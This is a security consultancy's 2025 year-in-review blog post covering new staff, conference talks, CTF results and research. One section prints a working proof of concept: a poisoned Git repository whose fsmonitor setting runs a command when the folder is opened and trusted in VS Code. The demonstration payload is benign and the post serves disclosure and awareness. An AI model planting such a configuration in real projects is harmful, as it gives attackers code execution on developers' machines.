---
title: TantoSec Wrapped 2025
source: https://tantosec.com/blog/2025/12/tantosec-wrapped-2025/
source_host: tantosec.com
clip_date: 2026-11-10T10:24:32+08:00
trace_id: 9b1dd4f0-68dc-41bc-aad6-54ee1416b8f9
content_hash: 7a9f86733777b2f2ffd6edf7695a8b4cde38552fcf4447ab941b26512a1c992d
status: synced
tags: []
series: null
feed_source: Tanto Security·漏洞研究
ai_summary: null
ai_summary_style: null
images_status:
  total: 17
  succeeded: 17
  failed_urls: []
notion_page_id: 41475244-d011-81c7-93d5-f843d275a86f
ioc:
  cves:
    - CVE-2025-55188
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

Tanto Security is going on break until the 5th of January 😌

Before we do, we wanted to take a moment to reflect on 2025 and celebrate some of the neat things we did. Indulge us as we brag a little because we’re really not good at doing the “cool and mysterious” thing.

## Tanto Security Touches Grass

We kicked off the year with a company-wide summit and a trip to Lysterfield Lake in Victoria for a day of sun and mountain biking.

![Fourteen people, their faces blurred, standing with mountain bikes in front of a lake](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/d59e2b36fcc51f8e.webp) ![A rider’s view over mountain bike handlebars of a bush trail, following another rider](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/bae11f5211055506.webp)

Once we’d had enough of being outdoorsy we retreated to the Melbourne office where some of us decided to try to pwn the office printer. Who prints things these days anyway? *One of us* didn’t have their laptop with them. Instead they fiddled with their phone and wrote an Apple Shortcut to slam audio at a speech-to-text API and then slam the result of that at an LLM API and then slam the result of *that* right at the printer’s port 9100 using the only primitive Apple Shortcuts gives - a HTTP POST.

![An Apple Shortcut that records audio, transcribes it with OpenAI Whisper, sends it to GPT with the system prompt “You are a helpful assistant. Your responses will be printed on an Epson desk printer.”, and posts the conversation to the printer’s port 9100 (its address redacted)](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/ac1c5a2b45ee2a0f.webp) ![A printout of the raw request: HTTP headers, then the user asking “ChurchyBT” for a short story about living inside a printer, and the assistant’s story, “Life Inside the Printer”, with ASCII art of a printer](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9aba3ad95b794042.webp)

We like to get outdoors, but we clearly love to be indoors.

## Wake up babe new starters just dropped

Not ones to muck around too much, we brought on not one but two new consultants in January 🤗 [Josh](https://www.linkedin.com/in/joshua-nibbs/) is based in our Melbourne office, and [Noah](https://www.linkedin.com/in/noah-cooper-5442ab309/) in Sydney.

> Being on the TantoSec team has been exciting, working with cracked hackers who share tricks and support each other is living the dream.
> 
> I have what I think is a fairly standard IT/Computer Science background. Having spent time working for MSPs I’ve seen the effect cyber incidents can have on businesses and even individuals.
> 
> Lately I have been building internal (for now!) tools for the team, focused on my interest in FIDO2 and passkeys. I plan to release these tools in 2026 and I’m excited to see what the community will do with them.

— Josh Nibbs

> Joining TantoSec has taught me a lot, and being surrounded by incredibly talented, supportive and delightful people has been amazing. I couldn’t have foreseen a year ago that I would have the opportunity to give a conference talk with my colleague Jesse (the 🐐) and to find cool bugs with such a great team. I can’t wait to write a blog post of my own devious escapades next years 🥷 (once I lock in and perform some ‘devious escapades’ 😅)

— Noah Cooper

As is customary, they were furnished with the finest Tanto swag that our preferred swag vendors can furnish.

![Items laid out on a desk including a MacBook, iPhone, t-shirt, polo shirt, YubiKey, challenge coin, water bottle, beanie and stickers](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/530b079139ecca17.webp)

Make sure you find us at a conference in 2026 to grab a TantoSec t-shirt if you haven’t already 😁

## Hello, world!

[Justin Steven](https://www.linkedin.com/in/justinsteven/) (yours truly) joined in February as our Director of Research.

Tanto Security has always prided itself as a research-driven offensive security consultancy, dedicating 20% of our consultants’ time towards research projects of their own choosing. Lloyd, Marcio and Marco conscientiously built TantoSec as the kind of company they wanted to work at; one where people get to blow off steam between jobs, sharpen their skills, publish and present novel research, and develop their own personal brand.

> When they asked me to join the team, it was a way of doubling down on what was working. I have the absolute best job in the world and I get to work with some truly amazing folks. On an average week, approximately two of our consultants will be assigned to research time. I get to noodle with them on project ideas, encourage and shepherd and support their breaking of software and building of tools, celebrate the wins, mourn the inevitable dead ends, and help turn their discoveries into great blog posts and conference talks.
> 
> I also work on my own research, talk to customers, develop internal policies and procedures, present at conferences and run amok on social media (more on that below) but what really gets me up in the morning is getting to be a proud mama bird and seeing our people thrive 🫶

— Justin Steven

## Taming the beast

Justin’s arrival was soon followed by Carla’s in March. As our Delivery Operations Manager, [Carla](https://www.linkedin.com/in/carla-strong-253362288/) works with our customers to ensure engagements go off without a hitch and so that our hackers hitting the ground running from day one. No more missing credentials, unclear scopes and false starts. From end to end, Carla is your go-to for getting the best from your TantoSec engagements 😎

> I joined the Tanto team 10 months ago and immediately felt at home. I brought my many years of Delivery Ops experience to Tanto to help shape the operations function and to work closely with our very talented Consultants to deliver excellent outcomes for our clients. I’m really excited about my future with Tanto, and being part of the continued growth of the business.

— Carla Strong

## Checkbox checking

Also in March, Tanto Security [achieved ISO 27001 certification](https://trust.tantosec.com/) . Although we’ve always had a robust data security strategy, formal certification was important to us to reassure our clients that we’re serious about keeping them safe. Being able to shortcut some of the onboarding paperwork and security questionnaires (both on our end and on your end) is just a very nice bonus 😌

![Tanto Security Pty Ltd’s ISO/IEC 27001:2022 certificate, for its Melbourne and Sydney offices, covering its ISMS as it relates to the operations that support the provision of offensive cyber security services](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a27eebedaa769b2e.webp)

## Tanto Security ❤️ CrikeyCon

[CrikeyCon](https://crikeycon.com/) is a community-focused cyber security conference held in Brisbane, Australia.

![A photo of extendable banners at a conference. A magpie is perched on top of a Tanto Security banner.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/a91db643bac814d1.webp)

2025 was our second year sponsoring CrikeyCon and we sent a squad to learn, network, mingle, shake hands and hand out some of those sweet sweet TantoSec t-shirts.

Justin closed out the conference with a neat and trim edition of **“Well well well, if it isn’t the consequences of my own actions” - the time I got in the middle of 100,000 Linux machines and their LVFS firmware updates and then somehow bypassed the fwupd PGP signature checking 🙈**

[Watch “Justin Steven, “Well well well, if it isn’t the consequences of my own actions”, CrikeyCon 2025” on YouTube](https://www.youtube.com/watch?v=YKrRj96kcY8)

## That’s showbiz, baby

We can remember it like it was just nine months ago. Relaxing at the CrikeyCon afterparty just a month and change after starting with Tanto Security, Justin asked Lloyd if they could possibly maybe potentially have the creds for the Tanto Security social media accounts. Since then he hasn’t had his video editing software taken away from him even once but it’s probably been on the cards.

![A collage of eight TantoSec Instagram posts, among them memes captioned “My body is a machine that turns # masscan … into Sev 1 Outage” and “Say the opcode on beat”, and a PortSwigger invoice for a Burp Suite Repeater tab upgrade](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/301a9ec3b5a55f94.webp)

If you’re a fan of OC cyber security memes or you just want to keep up to date with our conference presentations, blog posts and other fun Tanto Security news in a way that doesn’t take itself too seriously, [check out our Instagram](https://www.instagram.com/tantosec/) and shoot us a DM - we’re yappy as anything and we’d love to chat!

## Re-Daniel

After a short stint away, [Daniel](https://www.linkedin.com/in/daniel-cooper4/) returned to the TantoSec pack in May.

> I’m very excited to be back at Tanto full time after working part time during 2024. One thing I love about Tanto is being surrounded by (for lack of a better word) giga-nerds - the feeling of being part of a team of people who are all deeply interested in technology and how to use and abuse it is like no other. I’m looking forward to seeing where the team goes in 2026, especially in the area of research projects. The hacks that my colleagues come up with never cease to amaze me, and I can’t wait to share the stuff I have cooking 👀

— Daniel Cooper

We were all absolutely thrilled to welcome him back, even if he calls us his giga-nerds (lovingly).

Although not from this year, we think Daniel’s BSides Canberra 2024 talk **How I fully compromised the “most advanced code execution system in the world”** absolutely slaps and is well worth a watch.

[Watch “Daniel Cooper, “How I fully compromised the ‘most advanced code execution system in the world’”, BSides Canberra 2024” on YouTube](https://www.youtube.com/watch?v=aW-w0c3v7Mw)

## We’d still be getting away with it if it weren’t for these meddling modern-day architectures

AusCERT is Australia’s longest-running cyber security conference. To its 24th annual event we sent [Lloyd Simon](https://www.linkedin.com/in/lloyd-simon-334b4592/) , our Managing Director and co-founder, to debut his talk **Evolution of Red Teaming from Windows domains to the cloud**. It’s a love letter to the days when running Responder would get you shells by lunch and a reflection on what it takes to succeed as a red teamer in a cloud-first Zero Trust EDR-enabled world.

[Watch “Lloyd Simon, “Evolution of Red Teaming from Windows domains to the cloud”, AusCERT 2025” on YouTube](https://www.youtube.com/watch?v=6JeKOsEh5O4)

## Get benchmarked, nerds

A few TantoSec folks took what should have been a pleasant and restful weekend, and instead threw themselves at the [HackTheBox Global Cyber Skills Benchmark CTF 2025: Operation Blackout](https://ctftime.org/event/2707/) .

A Capture the Flag (CTF) contest is basically a series of computer security challenges. Solve the challenge, get a “flag” (a sequence of characters that acts as a kind of password), enter the flag into the CTF platform to acquire points, and hopefully ascend the ranks of the scoreboard to fame and glory. Some challenges mirror real-world offensive security scenarios and situations, some are somewhat “synthetic” and are more of a bespoke puzzle than anything, but what all good CTFs have in common is that once you start collecting flags all you want to do is collect more flags.

Out of the 795 teams that registered (551 of which made it to the scoreboard) Tanto Security ranked 15th overall and first from within Oceania 😎

![A chat transcript. It is celebrating the completion of a difficult CTF challenge. The longest message says: traefik X-Real-IP bypass, buffer trickery in the custom poor man’s redis to do an arbitrary set to DOM clobber the bot to leak the cookie to log in as admin to upload a tar/elf polyglot using path traversal to a directory from which we get free a “run an elf” function](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/9c676506923d6909.webp)

## Birds of a feather

Justin Steven had the pleasure of joining Dave Farrow and Keith McCammon on Red Canary’s weekly Office Hours show. They yapped about the DPRK IT worker epidemic and Justin discussed his special interest of abusable functionality in IDEs and other software development software.

[Watch “Justin Steven with Dave Farrow and Keith McCammon on Red Canary’s Office Hours” on YouTube](https://www.youtube.com/watch?v=bX-J1N05238)

Justin is at least partly to blame for that annoying “dO You tRuSt The AuthOrS Of ThE fILeS iN this FolDER” prompt in Visual Studio Code. You should know that blindly clicking “yes” can lead to immediate arbitrary command execution 😇

Shown below is one of probably many ways to achieve this. It works from at least version 1.59.0 onwards (July 2021) to the latest version as of the time of writing, 1.107.1 (November 2025) using [a weird Git trick](https://github.com/justinsteven/advisories/blob/main/2022_git_buried_bare_repos_and_fsmonitor_various_abuses.md#visual-studio-code-poc-chained-with-ove-20210718-0001-via-git-clone) that Justin is particularly fond of.

```bash
% cd $(mktemp -d)

% mkdir poison

% echo 'ref: refs/heads/main' > poison/HEAD

% cat > poison/config

[core]

        repositoryformatversion = 0

        filemode = true

        bare = false

        worktree = "worktree"

        fsmonitor = "open /System/Applications/Calculator.app; false"

^D

% mkdir poison/{objects,refs,worktree}

% mkdir .vscode

% echo '{"git.ignoredRepositories": ["."]}' > .vscode/settings.json

% /Applications/Visual\ Studio\ Code.app/Contents/Resources/app/bin/code .
```

[Download the video](https://tantosec.com/derived/86f424c8f195bdfb6baf59745f72f271d20600e562402b7113d2fb5a432c23c3/vscode-workspace-trust-poc.mp4)

Stay frosty when code reviewing y’all 💀

## ‘Til the Sandman, he comes

In June we published [Sleepless Strings](https://tantosec.com/blog/2025/06/insomnia-api-client-template-injection/) which discusses a killer client-side template injection bug in Insomnia, a popular API client from Kong.

![An ashen-faced warrior lying in a bed. They have bloodshot eyes. A nearby clock shows the time 3:37](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/0ed7ee3f178c1a5b.webp)

The post discusses how our co-founder and Technical Director [Marcio Almeida](https://www.linkedin.com/in/marcioalmeida/) stumbled upon the bug, how he refined it into a remotely exploitable arbitrary command execution primitive via HTTP cookies, and how he and Justin went blow-for-blow with Kong bypassing ineffective patch after ineffective patch. It’s a sobering lesson in the importance of bug triage and wholistic vulnerability remediation. We think it’s well worth a read regardless of which side of the coordinated vulnerability disclosure dance you take.

## Going up?

Melbourne took a day to explore Werribee Gorge State Park and to climb some cliffs, as one does when they’re a bit tired of poking at keyboards. TantoSec superstar Ben Wilson managed to nail every route that our tour guide Aaron set for us 😎

[View “TantoSec’s Melbourne crew climbing at Werribee Gorge” on Instagram](https://www.instagram.com/p/DMg2obVh-TT/)

## Tanto Security ❤️ DownUnderCTF

We’re a long-time fan and sponsor of [DownUnderCTF](https://downunderctf.com/) - an annual Capture the Flag contest run by some of Australia’s best and brightest.

[Daniel Cooper](https://www.linkedin.com/in/daniel-cooper4/) and [Riyush Ghimire](https://www.linkedin.com/in/riyush-ghimire-b136721a5/) both contributed challenges to their contest - in their own personal time and capacity, mind you. It’s a nerve-wracking thing, putting some intentionally vulnerable software up for a focused security review and hoping that it’s only pwnable the one specific way you intended it to be. When solving Daniel’s mind-bending [dualzip](https://github.com/DownUnderCTF/Challenges_2025_Public/tree/main/misc/dualzip) challenge, competitor lunbun managed to find a fresh [arbitrary file write bug in 7-Zip](https://lunbun.dev/blog/cve-2025-55188/) . This allowed their team to be one of three who solved the challenge, albeit in a completely unintended way 🤯

![Screenshot of a Discord message from Daniel that says: bro people in the ductf discord server know more about how my challenge works than me](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fe1288d4029e602e.webp)

Some time before the event, our good friends at DownUnderCTF HQ reached out to ask if we could kindly do a software security review of [noCTF](https://github.com/noctf-project/noCTF) , their brand new in-house CTF scoreboard platform, as an act of community goodwill. Justin rolled up their sleeves and went bug-hunting, shaking out some DOM XSS issues and chaining two publicly-disclosed vulnerabilities in an out-of-date third-party dependency that could have exposed a scoreboard developer to exploitation 🥶 if you want to know more, or if you’re curious to know what a real Tanto Security pentest report looks like, check out the [blog post](https://tantosec.com/blog/2025/09/downunderctf-noctf-scoreboard-pentest-report/) where we published the full report with thanks to DownUnderCTF ❤️

![A depiction of a pentest report, printed as a hard cover book. It is titled “DownUnderCTF Inc. - Web App Assessment - noCTF”.](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/58f0141b2fda44df.webp)

As for the contest itself, a couple of folks from Tanto Security (excluding any of those who had contributed challenges to the event) stocked up on energy drinks and CTF playlists, [ranking 21st out of 1664 scoring teams](https://ctftime.org/event/2669) 😎

## Like stealing fish in a barrel from a baby

In August, [Ben Wilson](https://www.linkedin.com/in/ben-wilson-b01811208/) published [A Modern Approach to Outlook Email Spoofing](https://tantosec.com/blog/2025/08/modern-approach-to-outlook-email-spoofing/) - a written account of his system-specific spoofing adventures that he presented at BSides Canberra 2024.

![A masked warrior fishes in a lake from a small boat](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/edbaddbc28cb256c.webp)

It’s a patient and thoughtful journey, covering some SMTP oddities and progressively working towards the perfect Outlook phishing technique. You’ll learn how Ben managed to spoof an email from outside an organisation that appeared completely identical to an internal email, inheriting a victim user’s profile information and avoiding all of the usual user-facing security warnings. Even though many of the specific tricks have since been patched, it’ll serve you well as a primer for your own system-specific email spoofing research.

## BSides Canberra? More like BSides can-they-do-it.

During September, Tanto Security took not one, not two, not three, not four, not five, but **six talks** to Australia’s capital city, Canberra.

First cab off the rank was Lloyd, spinning his **Evolution of Red Teaming from Windows domains to the cloud** yarn to the delegation of [CRESTCon Australia](https://www.crest-approved.org/crestcon-australia/) .

Justin delivered a brand new talk in the BSides Canberra careers track. **TODO the Planet: Building a sustainable security career and personal life with GTD** went deep on a topic that’s near and dear to his heart, all about how he manages his time, priorities, and crazy ideas using a framework called Getting Things Done. The session wasn’t recorded, meaning Justin could be honest and raw about the challenges he’s faced over the years and the strategies he’s implemented to excel in his personal and professional life. Check out the [slides](https://github.com/tantosec/presentations/tree/main/2025/bsides-canberra/todo-the-planet) and if you have any burning GTD questions, you can reach Justin at [research@tantosec.com](mailto:research@tantosec.com).

![Justin standing at a lectern in front of a slide about handling a cluttered email inbox](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/2e1317ab6a766a4d.webp)

Lloyd played for Team Red in **The Career Debate: Red vs. Blue** alongside friend of TantoSec, Alexei Doudkine (Volkis). They took on Team Blue, consisting of Jasmina Rosa Zito (Canva) and Zoran Iliev (CBIT Digital Forensics Services – CDFS). Team Blue was ultimately triumphant in convincing the crowd that blue team is best team, but the real winners were the friends we made along the way.

Next up was [Animesh Acharya](https://www.linkedin.com/in/an1msh/) with **Navigating Bug Bounties: From NAs to P1s**. He delivered a stellar bug bounty primer, telling the story of his early days of frustration and malaise through to the way of thinking and working that got his bug bounty game on point. Whether you’re thinking of picking up the old bug bounty side hustle or you’re a bounty-hunting old-hand, there’s something for you in this talk to elevate your bountycraft and help you crack the modern meta.

[Watch “Animesh Acharya, “Navigating Bug Bounties: From NAs to P1s”, BSides Canberra 2025” on YouTube](https://www.youtube.com/watch?v=9etzR_sobh0)

A true sucker for punishment, Justin took to the main stage for BSides Canberra day two presenting a new and expanded version of his firmware supply chain capers. **“Well well well, if it isn’t the consequences of my own actions” - the time I got in the middle of 100,000 Linux machines and their fwupd/LVFS firmware updates 🙈** tells the story of “what’s the worst that could happen if I registered this dangling AWS S3 bucket” followed by “oh, there’s 100,000 Linux machines running outdated copies of the `fwupd` firmware updater utility” followed by “hmm, it looks like if I do this One Weird Trick™ to the LVFS update PGP signature then I can totally bypass the signature checking in `fwupd`, weird, I wonder how that works!” It’s a fun story with a bit of a sense of right person, right place, right time, trying the right weird thing. At the same time, Justin thinks there’s things you can do to increase your luck surface area. If you’re a fan of faffing around and finding out we think it’s well worth a watch.

[Watch “Justin Steven, “Well well well, if it isn’t the consequences of my own actions”, BSides Canberra 2025” on YouTube](https://www.youtube.com/watch?v=boT88qkWFTY)

Day three of BSides Canberra saw Marcio and Justin (ding ding hello everyone it’s me again) present **Sleepless Strings - Template Injection in Insomnia**. It’s a play-by-play of how Marcio originally stumbled upon a curious case of client-side template injection in a popular API client, followed by the pair’s back-and-forth with the vendor in which they exploited patch bypass after patch bypass. Justin and Marcio close with some *thoughts*. They think it’s best to carefully consider the root cause of an issue and plan a strategic fix rather than hoping for the best using sanitisation and sandboxing, it’s important to thoroughly triage your security bugs so they don’t sit on a public issue tracker for five years before someone shows you why they need to be taken seriously, and it’s crucial to choose the right technologies and design early on to avoid vulnerabilities becoming a load-bearing feature of your software. The talk is a must-watch for security researchers, product security teams, and anyone who uses client-side software with magical quality of life functionality.

[Watch “Marcio Almeida and Justin Steven, “Sleepless Strings - Template Injection in Insomnia”, BSides Canberra 2025” on YouTube](https://www.youtube.com/watch?v=7bMTu3yCZVc)

## Marco talks security testing strategy at CyberCon Melbourne

Hot off the heels of a monster effort in Canberra, Tanto Security’s Commercial Director and co-founder [Marco Cantarella](https://www.linkedin.com/in/marcocantarella1/) presented **But I want all the shiny things… How to align offensive security with your maturity and threat models** at [CyberCon Melbourne](https://melbourne2025.cyberconference.com.au/) , the largest cyber security conference in the southern hemisphere.

[Download the video](https://tantosec.com/derived/b90795b7d88ef8b7bf38513f3128654632324e9dc50e086275de17b3f6e0df1e/marco-cybercon-2025-promo.mp4)

Marco walked folks through how to use rapid threat modelling and organisational security maturity assessment strategies to right-size their offensive security testing investments.

![Marco presenting at a lectern in CyberCon’s Think Tank 2, beside a slide, “Act II – Understand Most Critical Assets and Focus Attention”](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/31afe815bf671495.webp)

Check out [Marco’s slides](https://github.com/tantosec/presentations/tree/main/2025/aisa-cyber-conference-melbourne/but-i-want-all-the-shiny-things) and [get in touch with us today](https://tantosec.com/contact/) to craft a crawl-walk-run security testing strategy that can grow with your organisation 😎

## A hacker walks onto an archery range

Our Sydney crew craved some sunlight and nourishment, and so they snuck off to propel some very pointy things at some very undeserving targets.

> In October, the Sydney team spent a very warm afternoon at the Sydney Olympic Park Archery Centre, taking part in an archery session. While a few arrows went astray, with a bit of focus and patience we all managed some excellent shots and some bullseyes, which was a bonus!

— Carla Strong

![Two photos of the Sydney team at an archery range: drawing bows at the shooting line, and setting their bows down, with targets beyond](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/121c95ce650853d3.webp)

## Taking care of business

Rounding out our new starters for the year, Tanto Security grew its salesforce by 100% with the introduction of [Tom](https://www.linkedin.com/in/thomas-mckeown-977b67123/) 💪

> It’s been exciting to join Tanto, a company that is already so well respected and has such a strong foundation already. My role is certainly made easy by the reputation Tanto holds among security professionals, clients, colleagues and competitors. I’m looking forward to deepening our relationships and broadening our customer base in 2026.

— Thomas McKeown

Tom brings to TantoSec a wealth of experience and a vast network. He can’t wait to help you tailor the right offensive security services for your needs, and I have it on good authority that he loves it when you put your favourite jokes into our [contact form](https://tantosec.com/contact/).

## Tanto Security ❤️ Kawaiicon

We’re huge fans of [Kawaiicon](https://kawaiicon.org/) , a cyber security conference in Wellington, New Zealand. Rising from the ashes of Kiwicon in 2019, Kawaiicon (“Infosec but cuter”) is an absolute powerhouse of an event held in an absolute stunner of a country.

[Noah](https://www.linkedin.com/in/noah-cooper-5442ab309/) and [Jesse](https://www.linkedin.com/in/solopie/) dazzled the crowd on day one of the conference with **Weaponising XSS for Red Teams**, a discussion on how to use Cross-Site Scripting (XSS) to platform phishing campaigns. They propose using XSS bugs to rewrite the contents of trustworthy webpages, creating super convincing phishing pages complete with MFA challenge flow. They’ve built an extensible tool called Shadow Browser that implements the technique and they can’t wait to release it in 2026 ☺️

[Watch “Noah and Jesse, “Weaponising XSS for Red Teams”, Kawaiicon 2025” on YouTube](https://www.youtube.com/watch?v=bvXUJsngrlo)

Justin took to the stage on day two to ~~present~~ perform something they call **Buzzkill: How using hacker tools can get you owned**. It’s a hell of a ride consisting of 257 slides with zero bullet points, covering three different remotely exploitable vulnerabilities in an open-source OSINT-driven Attack Surface Mapping tool called BBOT. From arbitrary code execution via archive extraction path traversal bugs through to arbitrary code execution via Git repo pillaging missteps, this talk serves as a reminder that hacker tools can have bugs too. He wants you to stay frosty, segment and isolate your offensive security workloads, keep your client’s data safe, and to give back to the open-source pentester tools you rely on with a security review of your own. We’re hackers dammit, let’s give someone who hunts pentesters a really bad day 😎

[Watch “Justin Steven, “Buzzkill: How using hacker tools can get you owned”, Kawaiicon 2025” on YouTube](https://www.youtube.com/watch?v=yvm8tohCpZ8)

## Like stealing fish in a barrel from a baby but this time in person

Ben Wilson brought the year to a close for us at the [ADF Cyber Skills Challenge](https://adfcsc.au/) in Canberra. He presented **Email spoofing: Discovery of novel system-specific email spoofing techniques**, a renewed and refreshed edition of his 2024 BSides Canberra talk which patiently discusses the development of a gold-standard Outlook phishing technique that has since been (mostly) patched.

![Ben Wilson presenting at the ADF Cyber Skills Challenge, beside a slide on an email’s message components: envelope, headers and body](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/4a9412e3ad3a8313.webp)

## 2026 and beyond

Tanto Security is just getting started 😎 we’ve got a whole lot of great stuff in the works and we can’t wait to share it with you soon.

Until then, stay safe and we hope you have a restful end to the year ❤️
